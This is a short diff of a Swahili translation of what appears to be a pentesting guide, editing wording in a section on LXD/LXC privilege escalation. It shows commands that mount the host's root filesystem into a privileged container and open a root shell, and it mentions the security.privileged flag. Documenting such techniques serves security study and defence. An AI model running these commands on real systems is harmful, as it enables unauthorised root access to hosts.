@@ -49,7 +49,7 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> Ikiwa unakutana na kosa _**Kosa: Hakuna hifadhi ya kuhifadhi iliyopatikana. Tafadhali tengeneza hifadhi mpya ya kuhifadhi**_\
+> Ikiwa unakutana na kosa hili _**Kosa: Hakuna hifadhi ya kuhifadhiwa iliyo patikana. Tafadhali tengeneza hifadhi mpya ya kuhifadhiwa**_\
 > Kimbia **`lxd init`** na **rudia** kipande cha amri kilichopita
 
 Hatimaye unaweza kutekeleza kontena na kupata root:
@@ -58,7 +58,7 @@ lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### Njia ya 2
+### Method 2
 
 Jenga picha ya Alpine na uanze kutumia bendera `security.privileged=true`, ukilazimisha kontena kuingiliana kama root na mfumo wa faili wa mwenyeji.
 ```bash
